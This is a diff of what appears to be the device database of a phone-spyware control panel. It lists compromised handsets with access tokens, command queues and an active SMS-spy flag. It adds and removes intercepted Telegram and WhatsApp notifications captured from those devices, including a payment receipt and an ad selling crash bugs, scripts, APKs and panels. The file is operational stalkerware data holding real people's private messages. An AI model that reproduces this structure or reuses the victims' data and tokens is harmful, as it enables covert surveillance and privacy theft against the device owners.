@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777335052,
+    "lastSeen": 1776777341046,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777334682,
+    "lastSeen": 1776777340673,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / AZ*********\n🏦 Method: DANA\n💰 Amount: Rp 2.500\n💸 Fee: Rp 211\n💵 Total Payload: Rp 2.711\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421211135241814\n🏷️ System ID: FSCL76336051\n⏰ 21 Apr 2026 • 20:15 WIB\n\n#DEPOSIT #DANA",
+        "time": "21/04 20:15",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777335797
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Hàblàr sobrè la muèrte",
+        "content": "HALO WARGA TELEGRAM GUE ( @StevenCrasher ) \nINGIN MEMPERKENALKAN SALAH SATU PT GUE YAITU ( @IkyyNotDev2 ) AND DIA SUDAH RESMI JADI PT VIPP GUA\nJIKA KALIAN INGIN TRX MURBUG, SC, APK, ATAU PANEL BISA KE DIA YAH, AND KALO DIA NGERIP BISA LAPOR GUA🦋\nJIKA ANDA MINAT JOIN PT VIPP, PV\n@StevenCrasher",
+        "time": "21/04 20:15",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777335782
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
+        "content": "♻️ Restarting bot...",
+        "time": "21/04 20:15",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777335763
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14378,30 +14402,6 @@
         "time": "21/04 19:41",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776775281371
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ROOM PUBLIK BY JEFF: Rose",
-        "content": "I've kicked Morlana $$$.",
-        "time": "21/04 19:41",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776775281344
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5887 pesan baru dari 48 obrolan",
-        "time": "21/04 19:41",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776775281328
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 19:38",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775103339
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777334909,
+    "lastSeen": 1776777340911,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
